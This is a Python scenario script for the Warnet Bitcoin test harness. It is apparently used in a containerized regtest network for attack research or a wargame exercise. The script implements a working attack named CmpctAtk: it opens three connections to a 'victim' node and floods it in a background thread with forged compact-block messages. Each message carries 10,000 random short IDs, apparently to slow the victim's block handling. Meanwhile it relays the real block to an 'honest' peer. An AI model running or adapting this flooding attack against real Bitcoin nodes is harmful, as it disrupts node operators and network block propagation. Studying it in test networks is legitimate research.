#!/usr/bin/env python3

from pprint import (
    pp,
)

import random
import threading
import socket
from datetime import (
    datetime,
    timedelta,
)
import time

from commander import Commander

from test_framework.test_framework import BitcoinTestFramework
from test_framework.blocktools import (
    add_witness_commitment,
    create_block,
    create_coinbase,
    NORMAL_GBT_REQUEST_PARAMS
)

from test_framework.wallet import MiniWallet

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    CBlockHeader,
    CInv,
    HeaderAndShortIDs,
    msg_block,
    msg_cmpctblock,
    msg_headers,
)

from test_framework.p2p import (
    P2PInterface,
)

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.

class CmpctAtk(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 0

    def add_options(self, parser):
        parser.description = (
            "CMPCT BLOCKS THEY SLOW"
        )
        parser.usage = "warnet run scenarios/cmpctatk.py"

    def connect_to_hostname(self, hostname):
        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(hostname)
        if chain == "regtest":
            dstport = 18444

        conn = P2PInterface()
        conn.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
        )()
        conn.wait_until(lambda: conn.is_connected, check_connected=False)
        return conn

    def build_block_on_tip(self, node):
        if self.wallet.get_balance() == 0:
            print("Generating 101 blocks to the miner address for funding.")
            self.generatetoaddress(node, 111, self.wallet.get_address(), sync_fun=self.no_op)
            self.wallet.rescan_utxos()
            assert (self.wallet.get_balance() > 0)

        txlist = [self.wallet.create_self_transfer()['tx']]

        block = create_block(tmpl=self.nodes[0].getblocktemplate(NORMAL_GBT_REQUEST_PARAMS), txlist=txlist)
        add_witness_commitment(block)
        block.solve()
        return block

    def build_fat_empty_cmpct(self, block):
        cmpct_block = HeaderAndShortIDs()
        cmpct_block.header = CBlockHeader(block)

        for i in range(10_000):
            shortid = int.from_bytes(random.randbytes(6), byteorder='little')
            cmpct_block.shortids.append(shortid)

        return cmpct_block

    def peer_requested_hash(self, conn, hash):
        """Checks if any getdata message contains a given hash."""

        last_data = conn.last_message.get("getdata")
        if not last_data:
            return False
        for item in last_data.inv:
            pp(item.hash)
            pp(hash)
            if item.hash == hash:
                return True

        return False
        # return any(x.hash == hash for x in last_data.inv)

    def run_test(self):
        attacker = self.tanks['miner']
        victim = "victim"
        honest = "honest"

        # Set-up, to get some funds in the wallet.
        honestpeer = self.connect_to_hostname(honest)

        self.wallet = MiniWallet(attacker)
        self.log.info("Creating funding block.")
        funding_block = self.build_block_on_tip(attacker)
        self.log.info("Sending funding block header to honest peer.")
        honestpeer.send_message(msg_headers([CBlockHeader(funding_block)]))
        honestpeer.wait_for_getdata([funding_block.sha256], timeout=5)
        honestpeer.send_and_ping(msg_block(funding_block))

        self.log.info(f"Attacking {victim}")
        attackers = []
        for _ in range(3):
            attackers.append(self.connect_to_hostname(victim))

        attack_stop_event = None
        attack_thread = None
        next_block_interrupt_time = None
        honestpeer_received = False
        while True:
            now = datetime.now()
            if next_block_interrupt_time is None or (honestpeer_received and now > next_block_interrupt_time):
                # When creating new block (at the top of the timeout condition):
                if attack_thread and attack_thread.is_alive():
                    self.log.info("Killing existing attack thread.")
                    # signal the spam thread to stop and wait shortly for it to exit
                    assert(attack_stop_event is not None)
                    attack_stop_event.set()
                    attack_thread.join(timeout=1.0)

                print("Timeout reached, refreshing attack block.")
                real_block = self.build_block_on_tip(attacker)
                attack_block = self.build_fat_empty_cmpct(real_block)
                attack_block_msg = msg_cmpctblock(attack_block.to_p2p())
                next_block_interrupt_time = datetime.now() + timedelta(seconds=15)
                honestpeer_received = False

            if not attack_thread:
                def spam(stop_event):
                    while not stop_event.is_set():
                        for conn in attackers:
                            conn.send_message(attack_block_msg)
                attack_stop_event = threading.Event()
                attack_thread = threading.Thread(target=spam, args=(attack_stop_event,), daemon=True)
                attack_thread.start()

            # If the honest peer has not already received the block, and has
            # requested the block after receiving the header from us: send the block.
            if not honestpeer_received:
                honestpeer.send_message(msg_headers([CBlockHeader(real_block)]))
                honestpeer.wait_for_getdata([real_block.sha256], timeout=5)
                honestpeer.send_and_ping(msg_block(real_block))
                honestpeer_received = True
                self.log.info(f"Honest peer sent us a getdata for {real_block.sha256} and we responded.")

def main():
    CmpctAtk().main()


if __name__ == "__main__":
    main()
